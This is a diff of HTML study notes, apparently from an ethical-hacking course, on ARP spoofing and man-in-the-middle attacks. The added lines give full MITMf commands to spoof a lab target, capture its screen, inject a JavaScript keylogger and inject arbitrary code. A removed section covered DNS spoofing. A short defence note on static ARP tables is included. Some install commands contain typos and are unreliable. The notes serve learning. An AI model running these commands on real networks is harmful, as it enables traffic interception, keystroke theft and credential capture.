@@ -1,12 +1,13 @@
-<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>MITM</title>
 </head><body><b><span style="font-size: 12pt">MITM: </span></b><span style="font-size: 12pt">man in the middle attack, we can launch only if we are able to intercept the communication between devices</span><br/>
 <br/>
-<span style="font-size: 12pt"><b>1-ARP Spoofing attack:</b></span><b/><span style="font-size: 12pt">allow us to redirect the flow of packets, this means that any messages any websites and images, usernames and passwords will have to flow through my computer, this allow me to read information modify it or drop it, this is very serious and very powerful attack<br/>
+<span style="font-size: 12pt"><b>1-ARP Spoofing attack:</b></span><b>&nbsp;</b><span style="font-size: 12pt">allow us to redirect the flow of packets, this means that any messages any websites and images, usernames and passwords will have to flow through my computer, this allow me to read information modify it or drop it, this is very serious and very powerful attack<br/>
 </span><span style="font-size: 12pt"><br/>
-</span><img src="2020-06-12 20_22_34-1. arp poisoning the.png"/><span style="font-size: 12pt"><br/>
+</span><img src="2020-06-12 20_22_34-1. arp poisoning the.png" /><span style="font-size: 12pt"><br/>
 </span><span style="font-size: 12pt"><br/>
 <br/>
 <b>ARP: </b>Address Resolution Protocol, Simple protocol used to map IP address of a machine to its MAC address<br/>
@@ -17,12 +18,12 @@
 <br/>
 #arp -a<br/>
 <br/>
-<img src="2020-06-12 20_39_20-1. arp poisoning the.png"/><br/>
+<img src="2020-06-12 20_39_20-1. arp poisoning the.png" /><br/>
 <br/>
 <br/>
 <br/>
 Why ARP Spoofing is possible:<br/>
-1-Clients <b>accept responses</b>even if they did not send a request<br/>
+1-Clients <b>accept responses</b>&nbsp;even if they did not send a request<br/>
 2-Clients trust response without any form of <b>verification<br/>
 </b><b><br/>
 </b><br/>
@@ -53,11 +54,11 @@ in another shell:<br/>
 <br/>
 </b>-Framework to run MITM attacks<br/>
 -Can be used to:<br/>
- -ARP Spoof targets(redirect the flow of packets)<br/>
- -Sniff data(urls,username, passwords)<br/>
- -Bypass HTTPS<br/>
- -Redirect domain request(DNS Spoofing)<br/>
- -Inject code in loaded pages<br/>
+&nbsp; -ARP Spoof targets(redirect the flow of packets)<br/>
+&nbsp; -Sniff data(urls,username, passwords)<br/>
+&nbsp; -Bypass HTTPS<br/>
+&nbsp; -Redirect domain request(DNS Spoofing)<br/>
+&nbsp; -Inject code in loaded pages<br/>
 <br/>
 <b>--&gt;first install MITMf</b><br/>
 #cd Desktop/data/<br/>
@@ -73,6 +74,17 @@ in another shell:<br/>
 #cd bdfactory/<br/>
 #./install.sh<br/>
 #cd ../..<br/>
+#python mitmf.py --help<br/>
+<br/>
+--&gt;<b>second way to install mitmf:</b><br/>
+#apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeq-dev libxml2.dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file<br/>
+#pip install virtualenvwrapper<br/>
+#gedit &nbsp;~/.bashrc<br/>
+add source /user/local/bin/virtualencwrapper.sh<br/>
+#mkvirtualenv MITMf -p /usr/bin/python2.7<br/>
+#git clone https://github.com/byt3bl33d3r/MITMf<br/>
+#cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update --recursive<br/>
+#pip insttall -r requirements.txt<br/>
 #python mitmf.py --help<br/>
 <br/>
 <b>ARP Spoofing Attack:</b><br/>
@@ -108,14 +120,39 @@ Solution:<br/>
 Solution:<br/>
 </span><span style="font-size: 12pt">-Downgrade HTTPS to HTTP (it's featuer in MITMf)</span><br/>
 <br/>
-<span style="font-size: 12pt"><b>HSTS--&gt;</b><div style="text-align: left"><span style="font-family: arial"> stands for HTTP Strict Transport Security, it's a web security policy mechanism that forces web browsers to interact with websites only via secure HTTPS connections (and never HTTP). This helps to prevent protocol downgrade attacks and cookie hijacking.</span></div> <br/>
+<span style="font-size: 12pt"><b>HSTS--&gt;</b><div style="text-align: left"><span style="font-family: arial"> stands for HTTP Strict Transport Security, it's a web security policy mechanism that forces web browsers to interact with websites only via secure HTTPS connections (and never HTTP). This helps to prevent protocol downgrade attacks and cookie hijacking.</span></div>&nbsp; <br/>
 <br/>
-<b>DNS Spoofing:</b><br/>
+</span><b><span style="font-size: 12pt">Capturing Screen of Target:</span><br/>
+<br/>
+</b><span style="font-size: 12pt">#cd Desktop/data/MITMf<br/>
+<br/>
+#python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 -i eth0 --screen --interval 5<br/>
+<br/>
+--&gt;screenshots is going to be in var/log/mitmf<br/>
+<br/>
+<b>Injecting a Keylogger:</b><br/>
+</span><span style="font-size: 12pt">#python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 -i eth0</span>&nbsp;--<span style="font-size: 12pt">jskeylogger<br/>
+</span><span style="font-size: 12pt"><br/>
+<br/>
+<b>CODE INJECTION:</b><br/>
+-Inject javascript/HTML code<br/>
+-Code gets executed by the target browser<br/>
+&nbsp; --&gt;use the --inject plugin<br/>
+<br/>
+Code can be:<br/>
+1-Stored in a file --js-file or --html-file<br/>
+2-Stored online --js-url or --html-url<br/>
+3-Supplied through the command line --js-payload or --html-payload<br/>
+<br/>
+ex:<br/>
+#python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 -i eth0 --inject --js-payload "alert('test');"<br/>
+ex:<br/>
+python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15 -i eth0 --inject --js-file /root/MITMf/alert.js<br/>
+<br/>
+<b>Note: </b>MITMf can inject js conde in http not in https, it's possible to inject js code in https but the process is a bit more complex<br/>
+<br/>
+<br/>
+<b>Note: &nbsp;</b>to protect yourself from ARP spoofing use XArp or use static IP tables which basically means that you have to configure each IP address, so you have to configure you ARP table and map each IP address to the relevant MAC address, even if someone tries to send the response to your computer try to change ARP table the system will refuse, the only problem with that is every time new device connecting to your network you'll have to manually configure that device<br/>
+<br/>
 </span><br/>
-<span style="font-size: 12pt">for ex: whenever a person requests Google.com we can actually take them to another website a fake website running on our own web server <br/>
-<br/>
---&gt;open other location--&gt;var/www/html/<br/>
-#service apache2 start<br/>
-</span><span style="font-size: 12pt">#leafpad /etc/mitmf/mitmf.conf</span><br/>
-#<span style="font-size: 12pt">mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.4 -i wlan0 --dns</span><br/>
 </body></html>
